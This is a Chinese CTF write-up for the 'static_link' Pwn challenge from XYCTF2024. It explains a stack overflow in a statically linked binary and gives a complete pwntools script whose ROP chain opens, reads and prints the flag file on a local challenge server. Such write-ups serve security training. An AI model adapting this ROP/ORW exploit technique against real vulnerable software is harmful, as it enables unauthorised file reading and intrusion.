# static_link

> 分类：Pwn

## 题目描述
静态链接程序，存在栈溢出，直接构造 ROP 链进行 ORW 读取 flag。

## 考察知识点
- 静态链接
- ROP 链构造
- ORW（open64 / read / puts）

## 解法
静态链接，直接 ORW。

```python
from pwn import *
import os

os.chdir('./bin')
#sh = process('./vuln')
sh = remote('127.0.0.1',11038)
elf = ELF('./vuln')

open64_addr = elf.symbols['open64']
read_addr = elf.symbols['read']
puts_addr = elf.symbols['puts']

rdi_ret = 0x0000000000401f1f
rsi_ret = 0x0000000000409f8e
rdx_ret = 0x0000000000451322

flag_addr = 0x4C7500

payload =  b'a'*0x20+p64(0)
payload += p64(rdi_ret)+p64(0)
payload += p64(rsi_ret)+p64(flag_addr)
payload += p64(rdx_ret)+p64(4)
payload += p64(read_addr)
payload += p64(rdi_ret)+p64(flag_addr)
payload += p64(rsi_ret)+p64(0)
payload += p64(rdx_ret)+p64(0)
payload += p64(open64_addr)
payload += p64(rdi_ret)+p64(3)
payload += p64(rsi_ret)+p64(flag_addr)
payload += p64(rdx_ret)+p64(64)
payload += p64(read_addr)
payload += p64(rdi_ret)+p64(flag_addr)
payload += p64(puts_addr)
input()
sh.send(payload)
input()
sh.send(b'flag')

sh.interactive()
```

## 参考答案
（未给出，getshell 后读取）

## 来源
- 作者：jht3 | https://jht3qaq.github.io/2024/04/26/XYCTF2024-Writeup/
